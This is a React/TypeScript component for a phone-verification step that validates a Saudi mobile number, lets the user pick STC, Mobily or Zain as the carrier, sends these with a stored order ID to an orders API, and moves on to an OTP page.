import { useNavigate } from "react-router-dom";
import { useDispatch, useSelector } from "react-redux";
import Header from "../components/Header";
import { VerificationHeader } from "../components/phone-verification/VerificationHeader";
import { PhoneInput } from "../components/phone-verification/PhoneInput";
import { OperatorSelector } from "../components/phone-verification/OperatorSelector";
import { PhoneVerificationService } from "../services/PhoneVerificationService";
import {
  setPhone,
  setOperator,
  setErrors,
  resetErrors,
} from "../redux/slices/phoneVerificationSlice";
import { RootState } from "../redux/store";
import { setPhoneNumber } from "../redux/slices/otpVerificationSlice";
import { sendPhone } from "../apis/orders";

const operators = [
  { id: "stc", name: "STC", logo: "/companies/stc.png" },
  { id: "mobily", name: "Mobily", logo: "/companies/mobily.png" },
  { id: "zain", name: "Zain", logo: "/companies/zain.png" },
];

export const PhoneVerification = () => {
  const navigate = useNavigate();
  const dispatch = useDispatch();
  const { phone, operator, errors } = useSelector(
    (state: RootState) => state.phoneVerification
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    dispatch(resetErrors());

    let isValid = true;

    if (!PhoneVerificationService.validatePhone(phone)) {
      dispatch(
        setErrors({
          phone: "يرجى إدخال رقم جوال صحيح يبدأ ب 05 ويتكون من 10 أرقام",
        })
      );
      isValid = false;
    }

    if (!operator) {
      dispatch(setErrors({ operator: "يرجى اختيار مشغل شبكة الجوال" }));
      isValid = false;
    }

    if (isValid) {
      try {
        await PhoneVerificationService.verifyPhone(phone, operator);
        const order_id = JSON.parse(localStorage.getItem("order_id"));
        await sendPhone(order_id, phone, operator);
        dispatch(setPhoneNumber(phone));
        navigate("/verify-otp");
      } catch (error) {
        console.error("Verification failed:", error);
      }
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-r from-[#146394] to-[#1a7ab8] flex flex-col items-center justify-start md:justify-center p-4">
      <Header />
      <div className="w-full max-w-4xl bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden mt-8 md:mt-0">
        <div className="p-4 md:p-8 space-y-4 md:space-y-6 relative">
          <VerificationHeader />
          <form onSubmit={handleSubmit} className="space-y-4 md:space-y-6">
            <PhoneInput
              value={phone}
              onChange={(value) => dispatch(setPhone(value))}
              error={errors.phone}
            />
            <OperatorSelector
              operators={operators}
              selectedOperator={operator}
              onSelect={(operatorId) => dispatch(setOperator(operatorId))}
              error={errors.operator}
            />
            <button
              type="submit"
              className="w-full bg-[#146394] text-white py-3 md:py-3.5 rounded-lg font-semibold transform transition-all duration-300 hover:scale-[1.02] active:scale-100 shadow-md hover:shadow-lg text-sm md:text-base"
            >
              تسجيل
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PhoneVerification;
